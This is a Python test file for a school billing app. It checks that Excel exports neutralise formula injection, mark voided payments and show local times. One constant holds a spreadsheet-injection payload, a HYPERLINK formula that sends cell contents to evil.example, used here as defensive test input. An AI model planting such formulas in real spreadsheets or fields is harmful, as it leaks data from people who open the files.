"""
Auditoría 2026-09-19: solo la plantilla de boletas neutralizaba fórmulas.
Las exportaciones de cartera vencida, corte del día y dashboard escribían
nombre_completo / concepto tal cual, así que un alumno llamado
`=HYPERLINK(...)` (posible vía importación masiva) se volvía una fórmula viva
al abrir el .xlsx. Además el corte exportado listaba los pagos anulados sin
marcarlos (las filas no sumaban el TOTAL) y mostraba la hora en UTC.
"""

import io
from datetime import timedelta
from decimal import Decimal

import openpyxl

from tests.conftest import crear_plan, crear_alumno, crear_usuario, login
from app import db, Cargo, ConceptoCobro, Pago, EstatusCargo, hoy_local, a_local

FORMULA = '=HYPERLINK("http://evil.example/?x="&A2,"Click")'


def _escenario(client):
    plan = crear_plan()
    alumno = crear_alumno(plan, nombre=FORMULA)
    concepto = ConceptoCobro(nombre='=1+1', monto_sugerido=Decimal('100'), activo=True)
    db.session.add(concepto); db.session.commit()
    cargo = Cargo(matricula_fk=alumno.matricula_id, concepto_cobro_fk=concepto.id, concepto='=1+1',
                  monto=Decimal('1000.00'), periodo_escolar='F', fecha_vencimiento=hoy_local() - timedelta(days=9))
    db.session.add(cargo); db.session.commit()
    crear_usuario()
    login(client, 'directivo1', 'clave12345')
    return alumno, cargo


def _libro(respuesta):
    assert respuesta.status_code == 200
    return openpyxl.load_workbook(io.BytesIO(respuesta.data))


def _formulas(libro):
    return [(ws.title, c.coordinate) for ws in libro for fila in ws.iter_rows() for c in fila if c.data_type == 'f']


def test_cartera_vencida_exportada_no_contiene_formulas_vivas(client, app):
    _escenario(client)
    assert _formulas(_libro(client.get('/reportes/cartera-vencida/exportar'))) == []


def test_corte_del_dia_exportado_no_contiene_formulas_vivas(client, app):
    _, cargo = _escenario(client)
    client.post(f'/cobro/{cargo.id}/pagar', data={'monto_pagado': '10'})
    assert _formulas(_libro(client.get('/reportes/cobros-del-dia/exportar'))) == []


def test_dashboard_exportado_no_contiene_formulas_vivas(client, app):
    _, cargo = _escenario(client)
    client.post(f'/cobro/{cargo.id}/pagar', data={'monto_pagado': '10'})
    assert _formulas(_libro(client.get('/cobros/dashboard/exportar'))) == []


def test_el_texto_original_se_conserva_visible_tras_neutralizar(client, app):
    _escenario(client)
    ws = _libro(client.get('/reportes/cartera-vencida/exportar'))['Cartera Vencida']
    assert ws['A4'].value == "'" + FORMULA  # neutralizado con apóstrofo, pero legible


def test_corte_exportado_marca_los_pagos_anulados_y_las_filas_cuadran_con_el_total(client, app):
    _, cargo = _escenario(client)
    client.post(f'/cobro/{cargo.id}/pagar', data={'monto_pagado': '600'})
    client.post(f'/cobro/{cargo.id}/pagar', data={'monto_pagado': '400'})
    primero = Pago.query.order_by(Pago.id).first()
    client.post(f'/pago/{primero.id}/anular', data={'motivo_anulacion': 'captura duplicada'})

    ws = _libro(client.get('/reportes/cobros-del-dia/exportar'))['Cobros del Día']
    encabezados = [c.value for c in ws[3]]
    assert 'Estatus' in encabezados
    col_estatus = encabezados.index('Estatus')
    filas = [f for f in ws.iter_rows(min_row=4, values_only=True) if f[0] and f[5] != 'TOTAL:' and isinstance(f[6], (int, float))]
    assert sorted(f[col_estatus] for f in filas) == ['ANULADO', 'VIGENTE']
    suma_vigentes = sum(f[6] for f in filas if f[col_estatus] == 'VIGENTE')
    total = next(f[6] for f in ws.iter_rows(min_row=4, values_only=True) if f[5] == 'TOTAL:')
    assert suma_vigentes == total == 400


def test_corte_exportado_muestra_la_hora_local_no_utc(client, app):
    _, cargo = _escenario(client)
    client.post(f'/cobro/{cargo.id}/pagar', data={'monto_pagado': '10'})
    pago = Pago.query.first()
    ws = _libro(client.get('/reportes/cobros-del-dia/exportar'))['Cobros del Día']
    hora = next(f[1] for f in ws.iter_rows(min_row=4, values_only=True) if f[0] and f[5] != 'TOTAL:' and isinstance(f[6], (int, float)))
    assert hora == a_local(pago.fecha_pago).strftime('%H:%M')
